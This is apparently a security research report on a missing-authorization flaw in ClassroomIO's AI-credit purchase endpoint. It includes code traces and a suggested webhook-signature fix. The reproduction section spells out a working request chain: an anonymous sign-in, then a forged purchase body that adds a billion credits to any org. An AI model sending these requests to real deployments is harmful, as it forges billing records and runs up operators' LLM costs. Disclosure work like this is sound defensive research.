# VULN-004 — `POST /agent/credits/purchase` mints unlimited AI credits for any org

| | |
|---|---|
| **ID** | VULN-004 (raw F-05) |
| **Software** | ClassroomIO |
| **Repository** | https://github.com/classroomio/classroomio |
| **Affected version** | 0.1.13 (`package.json`) — commit-pinned |
| **Commit** | `0c356ad6f1a4d8449425b902afae58b3ebd9f443` |
| **Severity** | High — **CVSS 3.1 8.5** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:L` (→ 9.3 unauthenticated via VULN-018) |
| **Status** | **CONFIRMED (dynamic)** |
| **Auth required** | Any session — here an **anonymous** session (VULN-018), i.e. effectively none |
| **What an attacker gains** | Arbitrary, unbounded AI-credit balance for any org → unlimited LLM spend on the operator's provider key; forged billing ledger |

## Summary

`POST /agent/credits/purchase` is shaped like a Polar payment webhook: it records a
purchase row and adds AI credits to an org. But it is gated only by
`authOrApiKeyMiddleware`, whose first branch admits *any* logged-in session — and via
the `anonymous()` plugin (VULN-018) an attacker mints a session with no account. There
is no HMAC/signature check, no org-admin check, and no membership check binding the
caller to the target org. `orgId`, `tokens`, and `providerOrderId` are all taken from
the request body, and the query does `balance += tokens`. Confirmed live: an anonymous
session posted `tokens: 1000000000` and the org's `ai_credit_balance` rose by exactly
that amount (observed `1e9 → 2e9` across repeated runs with fresh order ids).

## How it works (mechanism & code trace)

**Route — `apps/api/src/routes/agent/agent.ts:301-310`.** The handler validates the
body and hands it straight to the service:

```ts
.post('/credits/purchase', authOrApiKeyMiddleware, zValidator('json', ZAgentCreditPurchase), async (c) => {
  const body = c.req.valid('json');
  const purchase = await recordCreditPurchase(body);   // body → service, unmodified
  return c.json({ success: true, data: purchase });
})
```

Contrast the sibling **two lines above** (`agent.ts:288`), which is the *correct*
pattern for a user-initiated credit change:

```ts
.post('/credits', authMiddleware, orgAdminMiddleware, zValidator('json', ZAgentCreditsBody), async (c) => {
  const orgId = c.req.header('cio-org-id')!;    // org from the AUTHORIZED header, not the body
  const { amount } = c.req.valid('json');
  await addCredits(orgId, amount);
  ...
```

`/credits` requires `orgAdminMiddleware` and credits only the header org; `/credits/purchase`
requires neither.

**Middleware — `apps/api/src/middlewares/auth-or-api-key.ts:12-19`.** The gate's first
branch passes for any session:

```ts
export const authOrApiKeyMiddleware = async (c, next) => {
  const user = c.get('user');
  const session = c.get('session');
  if (user && session) {   // ANY session — including an anonymous-plugin session
    await next();
    return;
  }
  ...
```

An `anonymous()` session (VULN-018) sets `user`+`session`, so this branch passes with
no real account.

**Schema — `packages/utils/src/validation/agent/agent.ts:63-72`.** Every field is
client-supplied; note the total absence of a signature/HMAC field:

```ts
export const ZAgentCreditPurchase = z.object({
  orgId: z.string().uuid(),
  providerOrderId: z.string().min(1),   // attacker-chosen idempotency key
  tokens: z.number().int().positive(),  // attacker-chosen amount
  quantity: z.number().int().positive(),
  unitPriceCents: z.number().int().nonnegative(),
  currency: z.string().default('USD'),
  ...
});
```

**Sink — `packages/db/src/queries/agent/credit-purchase.ts:112-127`.** The query
records the fake purchase and increments the *body-supplied* org's balance:

```ts
if (existingBalance) {
  await tx.update(schema.aiCreditBalance)
    .set({ balance: sql`${schema.aiCreditBalance.balance} + ${input.tokens}` })   // += attacker tokens
    .where(eq(schema.aiCreditBalance.orgId, input.orgId));                        // attacker orgId
} else {
  await tx.insert(schema.aiCreditBalance).values({ orgId: input.orgId, balance: input.tokens });
}
```

Idempotency is keyed only on the attacker-chosen `providerOrderId`, so rotating it
allows unbounded repeated top-ups. `getTokenBalance` folds this balance into
`remaining`, so `enforceTokenBalance` never blocks subsequent AI usage.

## Why it is a vulnerability (reasoning)

The security invariant is: *a credit balance may only increase in response to a
verified payment from the payment provider (Polar), for the org that paid.* This
endpoint is the ingestion point for that provider callback — so it must authenticate
the **provider**, not a user. Instead it authenticates "is there any session," which
is the wrong principal entirely, and then trusts the body for the org and the amount.

The feature is supposed to grant credits an org *bought*; the code grants credits
*anyone asks for*, for *any* org, in *any* amount. A skeptic might say "maybe a session
is required precisely to scope it" — but the handler never reads the session at all
(no `c.get('user')`, no membership check), and the amount/org come from the body, so
the session is pure gate-passing with zero authorization value. The anonymous-session
chain removes even that fig leaf: the caller need not have an account. This is a direct
integrity violation of the billing ledger with real monetary consequence.

## Reproduction

Preconditions: none (target up). The exploit self-provisions the anon session.

1. Mint an anonymous session: `POST /api/auth/sign-in/anonymous` `{}` → `Set-Cookie`.
2. With that cookie, forge the purchase:
   ```
   POST /agent/credits/purchase
   {"orgId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd","providerOrderId":"cvehunt-<rand>",
    "tokens":1000000000,"quantity":1,"unitPriceCents":0,"currency":"USD"}
   ```
   → `HTTP 200 {"success":true,...}`.
3. Verify the side effect:
   `docker exec cio-postgres psql -U postgres -d classroomio -c "select balance from ai_credit_balance where org_id='48bbdff8-2ad5-46a3-a259-2ca3d52677dd';"`
   → balance increased by 1,000,000,000.
4. Automated: `./run.sh` → reads the balance before/after, prints
   `[PROOF] balance rose by 1000000000 …` and `[OK] exploit confirmed`, exits 0. See
   `run.log` and `response.txt`.

## Impact

- **Direct financial damage:** unlimited AI quota for any org means unbounded calls to
  the operator's metered LLM provider (`/agent/chat`, `/agent/generate-text`,
  autonomous course generation) — a real bill an attacker can run up arbitrarily.
- **Billing-integrity corruption:** forged `aiCreditPurchase` rows (provider `polar`)
  pollute revenue reporting; cross-tenant credit grants in cloud (attacker credits a
  competitor's org, or their own for free).
- **Pre-auth via chaining:** with **VULN-018** (anonymous session) the whole thing is
  unauthenticated (PR:N → CVSS 9.3), and **VULN-036/F-01** means the 100/window limiter
  cannot throttle a rotated-IP / anon flood of top-ups.
- Blast radius: any org on the instance (single-org here, all tenants in cloud).

## Suggested fix

At `apps/api/src/routes/agent/agent.ts:301`:

1. Remove `authOrApiKeyMiddleware`. Treat this as a real webhook: verify the Polar
   HMAC signature over the raw request body (reject on mismatch), or require the
   `PRIVATE_SERVER_KEY` bearer via `apiKeyMiddleware` *only* — never a user session.
2. Derive `orgId`, `tokens`, and the order id from the **verified** provider order
   payload, not from the client body.
3. Keep idempotency keyed on the provider's order id, but only *after* signature
   verification, so a forged `providerOrderId` cannot create ledger rows.

Principle: authenticate the *provider* for provider callbacks; never let the amount or
the beneficiary be attacker-controlled.

## References

- OWASP API Security Top 10 2023 — API3:2023 (Broken Object Property Level
  Authorization / mass-assignment of `orgId`,`tokens`) and API5:2023 (Broken Function
  Level Authorization).
- Polar / Stripe webhook security docs and the OWASP "Webhook" guidance — HMAC
  signature verification of the raw body is the required control for payment callbacks.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 88 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `ClassroomIO CVE vulnerability` — only the 9 known ClassroomIO CVEs; nothing about AI credits, billing or webhooks.
2. `classroomio GHSA security advisory github.com/advisories` — 9 advisories at github.com/advisories?query=classroomio; none billing/credits related; repo `security/advisories` page: none published.
3. `classroomio huntr OR hackerone OR snyk vulnerability report IDOR authorization` — no platform reports.
4. `classroomio "credits/purchase" OR "ai credits" vulnerability unlimited credits webhook signature` — nothing for ClassroomIO; only unrelated webhook-forgery advisories in other products (New API Stripe webhook, AVideo).
5. `classroomio polar webhook credit purchase authorization missing signature verification` — only Polar's generic webhook documentation; no ClassroomIO reports.
6. Direct read of the repo issue list filtered for security — no issue mentions credits, Polar or `/agent/*`; the only billing-adjacent issue is #662 (unauthenticated checkout API exposing PII + Stripe key, closed Jun 2026), a different endpoint.
7. Read hackmd.io/@hieuPenguinnn/classroomio-course-resource-id-scoping-idor — no credits/agent coverage.

**Related but distinct public references** (same class or component, not this bug):
- GitHub issue classroomio/classroomio#662 — unauthenticated checkout API leaks PII and a Stripe key; different route and different defect (information exposure, not credit minting).
- None for `POST /agent/credits/purchase` or `recordCreditPurchase`.

**Reasoning:** No public reference describes the `/agent/credits/purchase` route (`apps/api/src/routes/agent/agent.ts`), the `authOrApiKeyMiddleware` session branch, or the unsigned Polar-shaped purchase ingestion in `packages/db/src/queries/agent/credit-purchase.ts`. The AI-credits subsystem is new and absent from every public ClassroomIO disclosure. Caveat: the shared web-search budget was exhausted during this triage, so finding-specific queries were limited to those listed.
